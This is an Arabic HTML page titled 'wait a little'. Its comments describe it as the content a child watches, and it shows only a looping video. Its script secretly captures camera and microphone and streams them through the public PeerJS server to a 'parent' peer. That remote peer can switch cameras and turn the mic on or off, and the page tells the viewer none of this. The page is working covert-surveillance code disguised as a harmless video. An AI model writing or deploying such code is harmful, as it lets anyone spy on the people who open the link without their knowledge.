<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="UTF-8">
<title>انتظر قليلا </title>
</head>
<body>

<!-- المحتوى الذي يشاهده الطفل -->
<video id="content" width="100%" autoplay muted loop>
  <source src="your_video.mp4" type="video/mp4">
</video>

<script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
<script>
const room = new URLSearchParams(location.search).get("room");
let stream, peer, current = "environment", dataConn;

function startCamera(){
  navigator.mediaDevices.getUserMedia({
    video:{facingMode:current},
    audio:true
  }).then(s=>{
    stream = s;
    peer.on("call", call => call.answer(stream));
  }).catch(()=>alert("لم يتم السماح للكاميرا"));
}

function switchCamera(){
  current = current==="user" ? "environment" : "user";
  if(stream) stream.getTracks().forEach(t=>t.stop());
  startCamera();
}

function toggleMic(on){
  if(stream){
    stream.getAudioTracks().forEach(t=>t.enabled = on);
  }
}

// بدء الاتصال
window.onload = () => {
  peer = new Peer("child-"+room, {
    host:"peerjs.com",
    secure:true,
    port:443
  });

  peer.on("open", () => {
    startCamera();

    // استقبال أوامر الأب
    dataConn = peer.connect("parent-"+room);
    dataConn.on("data", data => {
      if(data.cmd === "switchCamera"){
        switchCamera();
      } else if(data.cmd === "mic"){
        toggleMic(data.value);
      }
    });
  });
}

// إيقاف عند إغلاق الصفحة
window.onbeforeunload = () => {
  if(stream) stream.getTracks().forEach(t=>t.stop());
  peer && peer.destroy();
};
</script>

</body>
</html>
